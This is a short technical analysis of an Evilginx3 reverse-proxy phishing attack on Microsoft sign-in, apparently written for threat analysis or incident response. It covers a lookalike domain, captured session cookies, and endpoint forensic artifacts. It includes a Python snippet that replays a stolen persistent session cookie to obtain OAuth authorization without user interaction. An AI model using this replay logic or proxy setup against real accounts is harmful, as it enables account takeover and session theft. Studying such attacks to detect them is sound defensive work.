# Technical Analysis: Memory Extraction & Token Replay Dynamics

## Reverse Proxy Architecture

```
[ Victim Client ] <---- TLS 1.3 ----> [ Evilginx3 Proxy ] <---- TLS 1.3 ----> [ Legitimate IdP ]
                                        (185.196.8.21)                          (login.microsoftonline.com)
```

The reverse proxy modifies the `Host` header on outgoing requests and replaces instances of `login.microsoftonline.com` with `login.microsoftonline-auth.com` on incoming response HTML, JavaScript, and cookie headers.

## Header Trace

### Intercepted Set-Cookie Response from IdP:
```http
HTTP/1.1 302 Found
Location: https://account.activedirectory.windowsazure.com/
Set-Cookie: ESTSAUTH=0.ATAA...; path=/; domain=.login.microsoftonline.com; secure; HttpOnly; SameSite=None
Set-Cookie: ESTSAUTHPERSISTENT=0.ATAA...; expires=Fri, 13-Feb-2027; path=/; domain=.login.microsoftonline.com; secure; HttpOnly; SameSite=None
Set-Cookie: esctx=AQABAAAA...; path=/; domain=.login.microsoftonline.com; secure; HttpOnly; SameSite=None
```

### Script Replay Logic:
Once captured by the phishlet, the token is passed to a Python automation worker:

```python
import requests

session = requests.Session()
session.cookies.set("ESTSAUTHPERSISTENT", captured_token, domain="login.microsoftonline.com")
session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})

# Requesting OAuth2 token without user interaction
res = session.get("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=...&response_type=code&scope=https://graph.microsoft.com/.default")
```

## Forensic Artifacts on Endpoint

- **DNS Cache:** Lookups for `login.microsoftonline-auth.com` resolve to single-homed bulletproof VPS `185.196.8.21` rather than Microsoft Anycast IP ranges (`20.190.128.0/18`).
- **Browser History:** Absence of native IdP SSO session handshakes.
- **WebAuthn Credential ID:** The credential ID created during registration is bound to `login.microsoftonline-auth.com`, leaving the genuine relying party identifier unlinked.
